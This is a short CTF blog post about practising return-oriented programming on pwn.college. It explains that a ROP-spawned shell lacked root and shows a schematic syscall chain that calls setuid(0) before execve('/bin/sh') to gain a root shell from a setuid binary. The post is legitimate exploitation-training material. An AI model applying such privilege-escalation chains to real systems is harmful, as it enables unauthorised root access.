---
layout: post
title: Some Notes on ROP Chain, execve, and setuid
tags: [CTF, pwn]
---

So I was practicing ROP on [pwn.college](https://pwn.college/) (btw this is a really cool website, pwn environment set up for you? never heard of that),
I noticed something strange(?) after getting a shell from a ROP chain.

```
$ id
uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
```

I am not root?

Then I realized that maybe a `setuid` is required before `execve`, which works out perfectly.

So if `execve` doesn't give you a root shell, try adding `setuid` before it may work.
The ROP chain would then be

```
pop_rax + 0x69 # setuid, nice
pop_rdi + 0x0 # or any other uid you need
syscall

pop_rax + 0x3b # execve
pop_rdi + <addr to /bin/sh>
pop_rsi + 0x0
pop_rdx + 0x0
syscall
```

Notice that according to the reference website, it may not work if the attacked binary is not a `setuid` binary.
See the reference website for more detail.

# Reference
- [SetUID Rabbit Hole \| 0xdf hacks stuff](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html)
